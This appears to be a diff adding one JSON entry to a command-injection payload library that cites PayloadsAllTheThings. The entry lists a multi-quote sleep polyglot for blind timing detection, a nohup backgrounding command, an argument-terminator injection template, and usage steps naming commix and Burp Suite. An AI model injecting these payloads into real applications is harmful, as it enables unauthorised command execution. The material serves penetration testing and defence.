@@ -1,0 +1,61 @@
+{
+  "id": "payload_000021",
+  "important": {
+    "title": "Command Injection - Polyglot & Tricks",
+    "category": "Web Vulnerabilities",
+    "sub_category": "Polyglot - Tricks",
+    "tags": ["polyglot","tricks","background","nohup","quote-bypass"],
+    "targets": { "os": ["Linux","Unix"], "system": ["Shell","Scripting"] },
+    "risk": "high"
+  },
+  "variants": [
+    {
+      "match": { "os": ["Any"], "system": ["Polyglot"] },
+      "payload": {
+        "explanation": "Payload that survives multiple quoting/escaping contexts to trigger commands in varied contexts.",
+        "code": "1;sleep${IFS}9;#${IFS}';sleep${IFS}9;#${IFS}\";sleep${IFS}9;#${IFS}",
+        "run_context": "Injected where input may be wrapped in different quote styles.",
+        "placeholders": { "SLEEP": "9" },
+        "notes": "Useful to detect blind injection via timing (sleep)."
+      }
+    },
+    {
+      "match": { "os": ["Linux"], "system": ["Shell"] },
+      "payload": {
+        "explanation": "Background a long-running command so parent process doesn't block.",
+        "code": "nohup sleep 120 > /dev/null &",
+        "run_context": "When injected into a process that would otherwise time out the child process.",
+        "placeholders": {},
+        "notes": "Use responsibly in lab environments only."
+      }
+    },
+    {
+      "match": { "os": ["Any"], "system": ["Shell"] },
+      "payload": {
+        "explanation": "Remove or neutralize arguments after injection using -- or argument tricks.",
+        "code": "original -- ; malicious_command",
+        "run_context": "When application appends further args after user input.",
+        "placeholders": {},
+        "notes": "Behavior depends on how application constructs its argv."
+      }
+    }
+  ],
+  "usage": {
+    "steps": [
+      "If blind, use sleep-based polyglots to detect timing differences.",
+      "Use nohup/ampersand to keep backgrounded processes running.",
+      "Test argument terminators (--), variable expansion, and random-case obfuscation."
+    ],
+    "tools": ["commixproject/commix", "Burp Suite"],
+    "code_samples": [
+      { "title": "Polyglot sleep", "description": "Multi-context sleep", "code": "1;sleep${IFS}9;#${IFS}';sleep${IFS}9;#${IFS}\";sleep${IFS}9;#${IFS}", "run_context": "shell" },
+      { "title": "Background long-running", "description": "nohup background", "code": "nohup sleep 120 > /dev/null &", "run_context": "shell" }
+    ],
+    "mitigations": [
+      "Sanitize inputs; avoid shell usage when possible.",
+      "Monitor for long-running unexpected processes."
+    ],
+    "references": []
+  },
+  "system": { "version": "2.0.0", "source": "PayloadsAllTheThings" }
+}
